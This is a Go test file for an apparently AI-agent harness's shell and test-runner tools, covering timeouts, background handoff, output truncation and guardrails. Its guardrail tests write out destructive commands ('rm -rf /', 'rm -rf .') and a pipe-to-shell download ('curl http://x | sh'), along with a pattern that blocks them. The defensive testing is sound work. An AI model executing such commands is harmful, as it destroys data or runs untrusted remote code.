package native

import (
	"context"
	"encoding/json"
	"fmt"
	"strings"
	"testing"
	"time"

	"marshal/internal/app/config"
	"marshal/internal/app/session"
	"marshal/internal/tools/registry"
)

// executionOf returns the structured execution record carried by a tool result,
// failing the test when the result has none: every ordinary shell/test result
// records one, and the identity in it is what pairs a launch with its eventual
// completion.
func executionOf(t *testing.T, res registry.ToolResult) registry.CommandExecution {
	t.Helper()
	ex, ok := res.Notice.Execution()
	if !ok {
		t.Fatalf("tool result carries no structured execution record: notice=%+v content=%q", res.Notice, res.Content)
	}
	return ex
}

// TestGitHygieneNote pins which commands earn a hygiene note.
func TestGitHygieneNote(t *testing.T) {
	cases := []struct {
		cmd  string
		want bool
	}{
		{"git merge feature-x", true},
		{"git stash push", true},
		{"git status", false},
		{"git log", false},
	}
	for _, tc := range cases {
		if got := gitHygieneNote(tc.cmd) != ""; got != tc.want {
			t.Errorf("gitHygieneNote(%q) nonempty=%v, want %v", tc.cmd, got, tc.want)
		}
	}
}

func TestShellRunGitMergeNote(t *testing.T) {
	root := t.TempDir()
	runner := &fakeRunner{result: CommandResult{Stdout: "merged\n", ExitCode: 0}}
	reg := registry.New()
	if err := RegisterAll(reg, Options{WorkspaceRoot: root, CommandRunner: runner, Guardrail: func(string, bool) error { return nil }}); err != nil {
		t.Fatalf("RegisterAll: %v", err)
	}
	res, err := invokeTool(t, reg, "shell.run", `{"command":"git merge feature-x"}`)
	if err != nil {
		t.Fatalf("shell.run returned error: %v", err)
	}
	if !strings.Contains(res.Content, "workspace.finish") {
		t.Fatalf("Content = %q", res.Content)
	}
}

// TestShellRunGitMergeNoteSurvivesTruncation pins the load-bearing ordering
// of the note: the settled command's own output is truncated FIRST and the
// note appended after, so a git merge whose output overflows the budget
// cannot swallow the advice. Re-applying limitOutput after the append would
// pass every other test in this file and still break this guarantee.
func TestShellRunGitMergeNoteSurvivesTruncation(t *testing.T) {
	root := t.TempDir()
	const limit = 64
	runner := &fakeRunner{result: CommandResult{Stdout: strings.Repeat("x", limit*4), ExitCode: 0}}
	reg := registry.New()
	if err := RegisterAll(reg, Options{
		WorkspaceRoot:  root,
		CommandRunner:  runner,
		Guardrail:      func(string, bool) error { return nil },
		MaxOutputBytes: limit,
	}); err != nil {
		t.Fatalf("RegisterAll: %v", err)
	}
	res, err := invokeTool(t, reg, "shell.run", `{"command":"git merge feature-x"}`)
	if err != nil {
		t.Fatalf("shell.run returned error: %v", err)
	}
	marker := strings.Index(res.Content, truncationMarker)
	if marker < 0 {
		t.Fatalf("expected the output to be truncated, got %q", res.Content)
	}
	note := strings.Index(res.Content, "workspace.finish")
	if note < 0 {
		t.Fatalf("note was swallowed by truncation: %q", res.Content)
	}
	if note < marker {
		t.Errorf("note must come after the truncation marker, got %q", res.Content)
	}
}

func TestTestRunToolDocumentsCommandOverride(t *testing.T) {
	ts := &toolSet{
		testCommand: "go test ./...",
	}
	tool := ts.testRunTool()
	if !strings.Contains(tool.Description, "command") {
		t.Errorf("test.run description should mention the command parameter; got: %s", tool.Description)
	}
	if !strings.Contains(tool.Description, "override") {
		t.Errorf("test.run description should mention that command overrides the configured test command; got: %s", tool.Description)
	}
}

func TestFormatCommandOutputOmitsEmptyStreams(t *testing.T) {
	cases := map[string]struct{ out, err, want string }{
		"stdout only": {"a\nb\n", "", "a\nb"},
		"stderr only": {"", "boom\n", "stderr:\nboom"},
		"both":        {"a\n", "w\n", "stdout:\na\n\nstderr:\nw"},
		"neither":     {"", "", ""},
		"blank edges": {"\n\nx\n\n", "", "x"},
	}
	for name, c := range cases {
		if got := formatCommandOutput(c.out, c.err); got != c.want {
			t.Errorf("%s: got %q want %q", name, got, c.want)
		}
	}
}

func TestShellRunInvokesRunnerForAllowedCommand(t *testing.T) {
	root := t.TempDir()
	runner := &fakeRunner{result: CommandResult{Stdout: "ok\n", ExitCode: 0}}
	reg := registry.New()
	if err := RegisterAll(reg, Options{WorkspaceRoot: root, CommandRunner: runner, Guardrail: func(string, bool) error { return nil }}); err != nil {
		t.Fatalf("RegisterAll: %v", err)
	}

	result, err := invokeTool(t, reg, "shell.run", `{"command":"go test ./...","timeout_seconds":5}`)
	if err != nil {
		t.Fatalf("shell.run returned error: %v", err)
	}
	if runner.requests[0].Command != "go test ./..." {
		t.Fatalf("command = %q", runner.requests[0].Command)
	}
	// The requested wait is the caller's budget; it is never sent to the runner
	// as an execution deadline.
	assertTimeout(t, runner.requests[0].Timeout, 0)
	if result.CommandExitCode == nil || *result.CommandExitCode != 0 {
		t.Fatalf("CommandExitCode = %#v", result.CommandExitCode)
	}
	// A clean run with no stderr shows the output alone: the streams are only
	// labelled when there are two of them to tell apart.
	if result.Content != "ok" {
		t.Fatalf("Content = %q, want the bare stdout", result.Content)
	}
}

func TestShellRunBlocksDangerousCommandBeforeRunner(t *testing.T) {
	root := t.TempDir()
	runner := &fakeRunner{}
	reg := registry.New()
	if err := RegisterAll(reg, Options{
		WorkspaceRoot: root,
		CommandRunner: runner,
		Guardrail: func(cmd string, system bool) error {
			if strings.Contains(strings.ToLower(cmd), "rm -rf") {
				return fmt.Errorf("blocked by guardrail: %s", cmd)
			}
			return nil
		},
	}); err != nil {
		t.Fatalf("RegisterAll: %v", err)
	}

	_, err := invokeTool(t, reg, "shell.run", `{"command":"rm -rf ."}`)
	if err == nil {
		t.Fatal("shell.run dangerous command returned nil error")
	}
	if len(runner.requests) != 0 {
		t.Fatalf("runner called %d times, want 0", len(runner.requests))
	}
}

// TestShellRunHonorsPositiveWaitWithoutTheOldCap pins the new wait contract:
// timeout_seconds is a waiting budget, so a request far beyond the removed
// 300-second execution cap is honoured exactly as asked and never reaches the
// runner as an execution deadline.
//
// The resolved wait is inspected on the recorded execution snapshot, so a
// 900-second request is proven without waiting 900 seconds: the call's own wait
// is what carries it, and the tool returns as soon as the command settles.
func TestShellRunHonorsPositiveWaitWithoutTheOldCap(t *testing.T) {
	root := t.TempDir()
	runner := newFakeRunner(withResult(CommandResult{Stdout: "done\n", ExitCode: 0}))
	cfg := config.Default()
	jm := NewJobManager(context.Background(), runner, root, 25, time.Hour, 1<<20)
	t.Cleanup(func() { _ = jm.Shutdown(context.Background()) })
	reg := registry.New()
	if err := RegisterAll(reg, Options{WorkspaceRoot: root, CommandRunner: runner, Config: cfg, JobManager: jm, Guardrail: func(string, bool) error { return nil }}); err != nil {
		t.Fatalf("RegisterAll: %v", err)
	}

	res, err := invokeTool(t, reg, "shell.run", `{"command":"go test ./...","timeout_seconds":900}`)
	if err != nil {
		t.Fatalf("shell.run returned error: %v", err)
	}
	req := runner.lastRequest(t)
	assertTimeout(t, req.Timeout, 0)
	if !req.RetainOutputTail {
		t.Fatal("a managed command must retain the output tail")
	}
	if got := executionOf(t, res).Wait; got != "15m0s" {
		t.Fatalf("recorded wait = %q, want the requested 900 seconds uncapped", got)
	}
	// The command settled while attached, so the caller got the real outcome
	// rather than a handle.
	if res.CommandExitCode == nil || *res.CommandExitCode != 0 {
		t.Fatalf("CommandExitCode = %v, want the actual 0", res.CommandExitCode)
	}
}

// TestShellRunUsesConfiguredForegroundWait pins that an omitted or zero
// timeout_seconds uses the positive configured default rather than launching
// with no wait at all. The configured wait is inspected on each result's
// recorded execution, so a 42-second default is proven without waiting it out.
func TestShellRunUsesConfiguredForegroundWait(t *testing.T) {
	root := t.TempDir()
	cfg := config.Default()
	cfg.Tools.Shell.ForegroundWaitSeconds = 42
	runner := newFakeRunner(withResult(CommandResult{Stdout: "ok\n", ExitCode: 0}))
	jm := NewJobManager(context.Background(), runner, root, 25, time.Hour, 1<<20)
	t.Cleanup(func() { _ = jm.Shutdown(context.Background()) })
	reg := registry.New()
	if err := RegisterAll(reg, Options{WorkspaceRoot: root, CommandRunner: runner, Config: cfg, JobManager: jm, Guardrail: func(string, bool) error { return nil }}); err != nil {
		t.Fatalf("RegisterAll: %v", err)
	}

	for _, args := range []string{`{"command":"hang"}`, `{"command":"hang","timeout_seconds":0}`} {
		res, err := invokeTool(t, reg, "shell.run", args)
		if err != nil {
			t.Fatalf("shell.run %s: %v", args, err)
		}
		if got := executionOf(t, res).Wait; got != "42s" {
			t.Fatalf("args %s: recorded wait = %q, want the configured 42s", args, got)
		}
	}
}

// TestShellRunRejectsNegativeWaitBeforeLaunch pins that an invalid wait is
// rejected before admission, so no process is left behind and the runner is
// never called.
func TestShellRunRejectsNegativeWaitBeforeLaunch(t *testing.T) {
	root := t.TempDir()
	runner := newFakeRunner(withRelease(make(chan struct{})))
	jm := NewJobManager(context.Background(), runner, root, 25, time.Hour, 1<<20)
	t.Cleanup(func() { _ = jm.Shutdown(context.Background()) })
	reg := registry.New()
	if err := RegisterAll(reg, Options{WorkspaceRoot: root, CommandRunner: runner, JobManager: jm, Guardrail: func(string, bool) error { return nil }}); err != nil {
		t.Fatalf("RegisterAll: %v", err)
	}

	_, err := invokeTool(t, reg, "shell.run", `{"command":"echo hi","timeout_seconds":-1}`)
	if err == nil || !strings.Contains(err.Error(), ">= 0") {
		t.Fatalf("negative timeout: err = %v, want a rejection", err)
	}
	if got := runner.countRuns(); got != 0 {
		t.Fatalf("runner runs = %d, want 0 (nothing may be launched)", got)
	}
	if got := jm.ActiveCount(); got != 0 {
		t.Fatalf("ActiveCount = %d, want 0", got)
	}
}

// TestShellRunRejectsUnrepresentableWait pins that a wait too large for a
// time.Duration is rejected rather than wrapped into a shorter one.
func TestShellRunRejectsUnrepresentableWait(t *testing.T) {
	root := t.TempDir()
	runner := newFakeRunner(withRelease(make(chan struct{})))
	jm := NewJobManager(context.Background(), runner, root, 25, time.Hour, 1<<20)
	t.Cleanup(func() { _ = jm.Shutdown(context.Background()) })
	reg := registry.New()
	if err := RegisterAll(reg, Options{WorkspaceRoot: root, CommandRunner: runner, JobManager: jm, Guardrail: func(string, bool) error { return nil }}); err != nil {
		t.Fatalf("RegisterAll: %v", err)
	}

	_, err := invokeTool(t, reg, "shell.run", `{"command":"echo hi","timeout_seconds":10000000000000}`)
	if err == nil || !strings.Contains(err.Error(), "too large") {
		t.Fatalf("overflowing timeout: err = %v, want a clear rejection", err)
	}
	if got := runner.countRuns(); got != 0 {
		t.Fatalf("runner runs = %d, want 0", got)
	}
}

// TestShellRunBackgroundReturnsImmediatelyWithNoDeadline pins the explicit
// background contract: the call returns the handle without waiting, and the
// nonnegative timeout argument is accepted without becoming an execution
// deadline.
func TestShellRunBackgroundReturnsImmediatelyWithNoDeadline(t *testing.T) {
	root := t.TempDir()
	started := make(chan struct{})
	release := make(chan struct{})
	runner := newFakeRunner(withStarted(started), withRelease(release))
	jm := NewJobManager(context.Background(), runner, root, 25, time.Hour, 1<<20)
	t.Cleanup(func() { _ = jm.Shutdown(context.Background()) })
	reg := registry.New()
	if err := RegisterAll(reg, Options{WorkspaceRoot: root, CommandRunner: runner, JobManager: jm, Guardrail: func(string, bool) error { return nil }}); err != nil {
		t.Fatalf("RegisterAll: %v", err)
	}

	done := make(chan registry.ToolResult, 1)
	go func() {
		res, _ := invokeTool(t, reg, "shell.run", `{"command":"sleep 30","background":true,"timeout_seconds":600}`)
		done <- res
	}()
	var bg registry.ToolResult
	select {
	case bg = <-done:
		if !strings.Contains(bg.Content, "job_id: ") {
			t.Fatalf("background Content = %q, want the handle", bg.Content)
		}
		if got := executionOf(t, bg).Wait; got != "10m0s" {
			t.Fatalf("recorded wait = %q, want the requested 600 seconds recorded", got)
		}
	case <-time.After(2 * time.Second):
		t.Fatal("background: true did not return immediately")
	}
	// The call returned without waiting; the process itself started.
	<-started
	// The nonnegative argument was recorded as evidence, never as a deadline.
	assertTimeout(t, runner.lastRequest(t).Timeout, 0)
	close(release)
}

// TestTestRunUsesDefaultCommandAndWait pins test.run's configured command and
// that it waits with the ordinary managed path: the runner sees no execution
// deadline.
func TestTestRunUsesDefaultCommandAndWait(t *testing.T) {
	root := t.TempDir()
	runner := &fakeRunner{result: CommandResult{Stdout: "pass\n", ExitCode: 0}}
	reg := registry.New()
	if err := RegisterAll(reg, Options{WorkspaceRoot: root, CommandRunner: runner, Guardrail: func(string, bool) error { return nil }}); err != nil {
		t.Fatalf("RegisterAll: %v", err)
	}

	result, err := invokeTool(t, reg, "test.run", `{}`)
	if err != nil {
		t.Fatalf("test.run returned error: %v", err)
	}
	if runner.requests[0].Command != "go test ./..." {
		t.Fatalf("command = %q", runner.requests[0].Command)
	}
	assertTimeout(t, runner.requests[0].Timeout, 0)
	if !strings.Contains(result.Summary, "go test ./...") {
		t.Fatalf("Summary = %q", result.Summary)
	}
}

// TestTestRunContinuationMatchesShellRun pins that a long test command adopts
// identical continuation behaviour: it hands off with a handle and an await
// instruction instead of being killed.
func TestTestRunContinuationMatchesShellRun(t *testing.T) {
	root := t.TempDir()
	release := make(chan struct{})
	runner := newFakeRunner(withRelease(release))
	jm := NewJobManager(context.Background(), runner, root, 25, time.Hour, 1<<20)
	t.Cleanup(func() { _ = jm.Shutdown(context.Background()) })
	reg := registry.New()
	if err := RegisterAll(reg, Options{
		WorkspaceRoot: root, CommandRunner: runner, JobManager: jm, TestCommand: "go test ./...",
		Config:    config.Config{Tools: config.ToolsConfig{Shell: config.ShellToolConfig{ForegroundWaitSeconds: 1}}},
		Guardrail: func(string, bool) error { return nil },
	}); err != nil {
		t.Fatalf("RegisterAll: %v", err)
	}

	res, err := invokeTool(t, reg, "test.run", `{}`)
	if err != nil {
		t.Fatalf("test.run returned error: %v", err)
	}
	if !strings.Contains(res.Content, "still running in the background") || !strings.Contains(res.Content, "agent.await") {
		t.Fatalf("test.run continuation = %q, want the handoff shape", res.Content)
	}
	if res.CommandExitCode != nil {
		t.Fatalf("CommandExitCode = %v, want none for a continuation", res.CommandExitCode)
	}
	assertTimeout(t, runner.lastRequest(t).Timeout, 0)
	close(release)
}

func TestTestRunAllowsOverrideButAppliesGuardrails(t *testing.T) {
	root := t.TempDir()
	runner := &fakeRunner{}
	reg := registry.New()
	if err := RegisterAll(reg, Options{
		WorkspaceRoot: root,
		CommandRunner: runner,
		TestCommand:   "go test ./pkg",
		Guardrail: func(cmd string, system bool) error {
			lower := strings.ToLower(cmd)
			if (strings.Contains(lower, "curl ") || strings.Contains(lower, "wget ")) && strings.Contains(lower, "|") {
				for _, shell := range []string{" sh", " bash", " zsh"} {
					if strings.Contains(lower, shell) {
						return fmt.Errorf("blocked by guardrail: %s", cmd)
					}
				}
			}
			return nil
		},
	}); err != nil {
		t.Fatalf("RegisterAll: %v", err)
	}

	if _, err := invokeTool(t, reg, "test.run", `{"command":"go test ./internal/tools/native"}`); err != nil {
		t.Fatalf("test.run override returned error: %v", err)
	}
	if runner.requests[0].Command != "go test ./internal/tools/native" {
		t.Fatalf("command = %q", runner.requests[0].Command)
	}

	if _, err := invokeTool(t, reg, "test.run", `{"command":"curl http://x | sh"}`); err == nil {
		t.Fatal("test.run dangerous override returned nil error")
	}
}

func TestShellRunRejectsGuardrailDeniedCommand(t *testing.T) {
	reg := registry.New()
	denied := map[string]bool{"rm -rf /": true}
	if err := RegisterAll(reg, Options{
		WorkspaceRoot: t.TempDir(),
		CommandRunner: &fakeRunner{},
		Guardrail: func(cmd string, system bool) error {
			if denied[cmd] {
				return fmt.Errorf("blocked: %s", cmd)
			}
			return nil
		},
	}); err != nil {
		t.Fatalf("RegisterAll: %v", err)
	}
	_, err := invokeTool(t, reg, "shell.run", `{"command":"rm -rf /"}`)
	if err == nil {
		t.Fatal("expected guardrail error, got nil")
	}
}

func TestShellRunStreamsOutputToSession(t *testing.T) {
	state := session.New(config.Config{}, t.TempDir(), time.Now(), session.Persistence{})
	state.SetActiveToolCall(session.ActiveToolCall{Name: "shell.run", Args: "echo hi", StartedAt: time.Now()})

	runner := &fakeRunner{
		result: CommandResult{ExitCode: 0, Stdout: "ok\n"},
	}
	root := t.TempDir()
	reg := registry.New()
	if err := RegisterAll(reg, Options{WorkspaceRoot: root, CommandRunner: runner, Guardrail: func(string, bool) error { return nil }, MaxOutputBytes: 100, SessionState: state}); err != nil {
		t.Fatalf("RegisterAll: %v", err)
	}

	tool, ok := reg.Lookup("shell.run")
	if !ok {
		t.Fatal("shell.run not registered")
	}
	res, err := tool.Handler(context.Background(), registry.ToolCall{Args: json.RawMessage(`{"command":"echo ok"}`)})
	if err != nil {
		t.Fatalf("handler err: %v", err)
	}
	if res.CommandExitCode == nil || *res.CommandExitCode != 0 {
		t.Fatalf("exit code = %v, want 0", res.CommandExitCode)
	}
	atc, _ := state.ActiveToolCall()
	if !strings.Contains(atc.Output, "ok") {
		t.Fatalf("active tool call output missing stream: %q", atc.Output)
	}
}

func TestCommandOutputIsLimited(t *testing.T) {
	root := t.TempDir()
	// The output itself must exceed the cap. It used to be the "stdout:" /
	// "stderr:" labels that pushed a short result over the limit; the
	// formatter now omits empty streams, so the test has to carry its own
	// bulk or it would pass without exercising truncation at all.
	runner := &fakeRunner{result: CommandResult{Stdout: strings.Repeat("abcdef", 8), ExitCode: 0}}
	reg := registry.New()
	if err := RegisterAll(reg, Options{WorkspaceRoot: root, CommandRunner: runner, Guardrail: func(string, bool) error { return nil }, MaxOutputBytes: 12}); err != nil {
		t.Fatalf("RegisterAll: %v", err)
	}

	result, err := invokeTool(t, reg, "shell.run", `{"command":"echo abcdef"}`)
	if err != nil {
		t.Fatalf("shell.run returned error: %v", err)
	}
	if !strings.Contains(result.Content, "[output truncated]") {
		t.Fatalf("Content = %q, want truncation marker", result.Content)
	}
}

func TestShellRunNonZeroExitReturnsOutputNotError(t *testing.T) {
	root := t.TempDir()
	runner := &fakeRunner{
		result: CommandResult{Stdout: "FAIL: test_a\n", Stderr: "exit status 1\n", ExitCode: 1},
		err:    fmt.Errorf("exit status 1"),
	}
	reg := registry.New()
	if err := RegisterAll(reg, Options{WorkspaceRoot: root, CommandRunner: runner, Guardrail: func(string, bool) error { return nil }}); err != nil {
		t.Fatalf("RegisterAll: %v", err)
	}
	result, err := invokeTool(t, reg, "shell.run", `{"command":"go test ./..."}`)
	if err != nil {
		t.Fatalf("non-zero exit must not return an error, got: %v", err)
	}
	if result.CommandExitCode == nil || *result.CommandExitCode != 1 {
		t.Fatalf("CommandExitCode = %v, want 1", result.CommandExitCode)
	}
	if !strings.Contains(result.Content, "FAIL: test_a") {
		t.Fatalf("Content must contain stdout, got: %q", result.Content)
	}
	if !strings.Contains(result.Content, "exit status 1") {
		t.Fatalf("Content must contain stderr, got: %q", result.Content)
	}
	// The settled record names the natural non-zero exit rather than a stop:
	// the caller saw the real outcome, so nothing was handed off.
	ex := executionOf(t, result)
	if ex.State != string(StatusFailed) || ex.Outcome != string(OutcomeNonZeroExit) {
		t.Fatalf("record = %q/%q, want failed/nonzero_exit", ex.State, ex.Outcome)
	}
	if ex.Attachment != registry.ExecutionAttachmentForeground {
		t.Fatalf("attachment = %q, want foreground for a waited completion", ex.Attachment)
	}
}

// TestShellRunTerminatedCommandStillReturnsError pins that a command the runner
// had to terminate is still a tool failure, while the observed exit and output
// travel with it instead of being discarded. This is the remaining "real
// failure" coverage the old timeout test carried; the deadline itself is gone,
// so the backend now reports the kill rather than a wall-clock timer.
func TestShellRunTerminatedCommandStillReturnsError(t *testing.T) {
	root := t.TempDir()
	runner := &fakeRunner{
		result: CommandResult{Stdout: "partial\n", ExitCode: -1, Meta: registry.SandboxMeta{Enabled: true, Backend: "restricted", KilledReason: "cancelled"}},
		err:    fmt.Errorf("signal: killed"),
	}
	reg := registry.New()
	if err := RegisterAll(reg, Options{WorkspaceRoot: root, CommandRunner: runner, Guardrail: func(string, bool) error { return nil }}); err != nil {
		t.Fatalf("RegisterAll: %v", err)
	}
	res, err := invokeTool(t, reg, "shell.run", `{"command":"go test ./..."}`)
	if err == nil {
		t.Fatal("a terminated command must still return an error")
	}
	if !strings.Contains(res.Summary, "killed: cancelled") {
		t.Fatalf("Summary = %q, want the termination reason", res.Summary)
	}
	if !strings.Contains(res.Content, "partial") {
		t.Fatalf("Content = %q, want the output observed before termination", res.Content)
	}
}

func TestShellRunStartupFailureStillReturnsError(t *testing.T) {
	root := t.TempDir()
	runner := &fakeRunner{
		result: CommandResult{}, // zero-valued: ExitCode=0, empty Meta
		err:    fmt.Errorf("exec: not found"),
	}
	reg := registry.New()
	if err := RegisterAll(reg, Options{WorkspaceRoot: root, CommandRunner: runner, Guardrail: func(string, bool) error { return nil }}); err != nil {
		t.Fatalf("RegisterAll: %v", err)
	}
	_, err := invokeTool(t, reg, "shell.run", `{"command":"nonexistent-binary"}`)
	if err == nil {
		t.Fatal("startup failure must still return an error")
	}
}

// TestShellRunForegroundWaitHandsOffWithoutRestarting pins the central managed
// contract end to end through the tool: one launch, one PID and one identity
// across the handoff, with the active-call display still owned by the call that
// started it until the wait ends.
func TestShellRunForegroundWaitHandsOffWithoutRestarting(t *testing.T) {
	root := t.TempDir()
	release := make(chan struct{})
	runner := newFakeRunner(withRelease(release), withPID(777), withLiveOutput("early\n"))
	jm := NewJobManager(context.Background(), runner, root, 25, time.Hour, 1<<20)
	t.Cleanup(func() { _ = jm.Shutdown(context.Background()) })
	reg := registry.New()
	if err := RegisterAll(reg, Options{
		WorkspaceRoot: root, CommandRunner: runner, JobManager: jm,
		Config:    config.Config{Tools: config.ToolsConfig{Shell: config.ShellToolConfig{ForegroundWaitSeconds: 1}}},
		Guardrail: func(string, bool) error { return nil },
	}); err != nil {
		t.Fatalf("RegisterAll: %v", err)
	}

	res, err := invokeTool(t, reg, "shell.run", `{"command":"sleep 30"}`)
	if err != nil {
		t.Fatalf("shell.run returned error: %v", err)
	}
	ex := executionOf(t, res)
	if ex.Wait != "1s" {
		t.Fatalf("recorded wait = %q, want the configured 1s", ex.Wait)
	}
	if ex.Attachment != registry.ExecutionAttachmentBackground {
		t.Fatalf("attachment = %q, want background after the handoff", ex.Attachment)
	}
	if ex.DisplayID == "" || ex.ExecutionID == "" {
		t.Fatalf("record = %+v, want a display id and an execution identity", ex)
	}
	if got := runner.countRuns(); got != 1 {
		t.Fatalf("runner runs = %d, want exactly 1 through the handoff", got)
	}

	// The same execution continues, still with its published PID.
	live, _, err := jm.Output(ex.DisplayID, 0)
	if err != nil {
		t.Fatalf("Output: %v", err)
	}
	if live.PID != 777 {
		t.Fatalf("PID = %d, want the same 777", live.PID)
	}
	if live.ExecutionID != ex.ExecutionID {
		t.Fatalf("ExecutionID = %q, want the same %q", live.ExecutionID, ex.ExecutionID)
	}
	close(release)
}

// TestShellRunStreamedOutputStopsAtHandoff pins display ownership: the active
// call keeps receiving output while the command is attached, and the retained
// tail still holds the late bytes afterwards.
func TestShellRunStreamedOutputStopsAtHandoff(t *testing.T) {
	state := session.New(config.Config{}, t.TempDir(), time.Now(), session.Persistence{})
	state.SetActiveToolCall(session.ActiveToolCall{Name: "shell.run", Args: "sleep 30", StartedAt: time.Now()})

	root := t.TempDir()
	started := make(chan struct{})
	release := make(chan struct{})
	runner := newFakeRunner(withStarted(started), withRelease(release), withLiveOutput("while-attached\n"))
	jm := NewJobManager(context.Background(), runner, root, 25, time.Hour, 1<<20)
	t.Cleanup(func() { _ = jm.Shutdown(context.Background()) })
	reg := registry.New()
	if err := RegisterAll(reg, Options{
		WorkspaceRoot: root, CommandRunner: runner, JobManager: jm, SessionState: state,
		Config:    config.Config{Tools: config.ToolsConfig{Shell: config.ShellToolConfig{ForegroundWaitSeconds: 1}}},
		Guardrail: func(string, bool) error { return nil },
	}); err != nil {
		t.Fatalf("RegisterAll: %v", err)
	}

	// Run the call as the agent loop does, with a live active tool call.
	handlerDone := make(chan registry.ToolResult, 1)
	go func() {
		res, _ := invokeTool(t, reg, "shell.run", `{"command":"sleep 30"}`)
		handlerDone <- res
	}()
	<-started

	// While attached, streamed bytes reach the active tool-call row.
	deadline := time.Now().Add(2 * time.Second)
	for {
		if atc, ok := state.ActiveToolCall(); ok && strings.Contains(atc.Output, "while-attached") {
			break
		}
		if time.Now().After(deadline) {
			t.Fatal("attached output never reached the active tool call")
		}
		time.Sleep(5 * time.Millisecond)
	}

	res := <-handlerDone
	if !strings.Contains(res.Content, "while-attached") {
		t.Fatalf("continuation Content = %q, want the retained tail", res.Content)
	}
	close(release)
}
